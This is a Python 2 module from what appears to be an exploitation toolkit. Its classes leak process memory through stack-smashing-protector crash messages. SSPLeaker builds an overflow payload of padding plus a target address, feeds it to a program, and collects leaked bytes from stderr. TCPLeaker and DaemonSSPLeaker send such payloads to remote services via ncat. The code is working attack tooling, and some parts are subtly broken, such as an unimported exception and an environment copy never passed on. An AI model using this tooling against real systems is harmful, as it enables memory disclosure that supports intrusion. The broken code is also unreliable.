import sys
import os
import subprocess

from .base import Leaker, RegexParser
from .utils import convert_address_to_string




class SSPParser(RegexParser):
    def __init__(self):
        super(SSPParser, self).__init__(r'\*\*\* stack smashing detected \*\*\*: (.*) terminate')


class StdinLeaker(Leaker):
    def input(self):
        line = sys.stdin.readline()

        if line == "":
            raise LeakerEOS()

        return line[:-1]

    def output(self, leak_piece):
        sys.stdout.write(leak_piece)


class TCPLeaker(Leaker):
    def __init__(self, host, port, **kwargs):
        super(TCPLeaker, self).__init__(**kwargs)

        self.host = host
        self.port = port

    def input(self):
        nc = subprocess.Popen(['ncat', self.host, self.port], stdin=subprocess.PIPE, stdout=subprocess.PIPE)
        stdout, stderr = nc.communicate(input=self.get_next_input_parameter())

        if stderr:
            print >>sys.stderr, 'input stderr:', stderr

        return stdout


class SSPLeaker(Leaker):
    def __init__(self, address, offset, cmd=None, **kwargs):
        super(SSPLeaker, self).__init__(**kwargs)

        if not cmd:
            raise AttributeError('cmd must be specified')

        self.cmd     = cmd
        self.address = address
        self.offset  = offset

    def input(self):
        # In this case is tricky to get the output: we need to add LIBC_FATAL_STDERR_ to environment variables
        # and interact with the stderr
        env = os.environ.copy()
        env.update({
            'LIBC_FATAL_STDERR_': 1,
        })
        nc = subprocess.Popen(self.cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        stdout, stderr = nc.communicate(input=self.get_next_input_parameter())

        return stderr

    def get_next_input_parameter(self):
        return "\x41" * self.offset + convert_address_to_string(self.address)

    def update(self, leak):
        """
        The SSP leak a memory content up to a null byte that is not
        included, here we add the missing byte and update the address accordingly.
        """
        updated_leak = leak + "\x00"

        leaked_bytes_number = len(updated_leak)
        #print >> sys.stderr, " >", leaked_bytes_number
        self.address += leaked_bytes_number

        return updated_leak

    def output(self, leak):
        sys.stdout.write(leak)
        sys.stdout.flush()


class DaemonSSPLeaker(TCPLeaker):
    def __init__(self, host, port, address, offset, **kwargs):
        super(DaemonSSPLeaker, self).__init__(host, port, **kwargs)

        self.address = address
        self.offset  = offset
